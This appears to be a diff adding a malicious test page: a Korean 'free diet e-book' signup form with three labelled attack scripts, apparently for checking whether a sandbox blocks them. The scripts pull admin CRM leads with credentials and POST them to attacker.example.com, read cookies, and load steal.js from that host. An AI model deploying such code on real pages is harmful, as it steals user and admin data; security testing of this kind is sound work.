@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>무료 전자책 신청</title>
+</head>
+<body>
+  <h1>다이어트 전자책 무료 배포</h1>
+  <form>
+    <input type="email" name="email" placeholder="이메일" required>
+    <button type="submit">신청하기</button>
+  </form>
+
+  <!-- 공격 1: 관리자 API로 CRM 명단 탈취 -->
+  <script>
+    fetch('http://localhost:8080/api/admin/forms/1/leads', { credentials: 'include' })
+      .then(function (r) { return r.json(); })
+      .then(function (d) {
+        console.log('LEAKED', d);
+        return fetch('https://attacker.example.com', {
+          method: 'POST', body: JSON.stringify(d)
+        });
+      })
+      .catch(function (e) { console.log('BLOCKED', e); });
+  </script>
+
+  <!-- 공격 2: 쿠키 직접 접근 -->
+  <script>
+    console.log('COOKIE:', document.cookie);
+  </script>
+
+  <!-- 공격 3: 외부 스크립트 로드 -->
+  <script src="https://attacker.example.com/steal.js"></script>
+</body>
+</html>
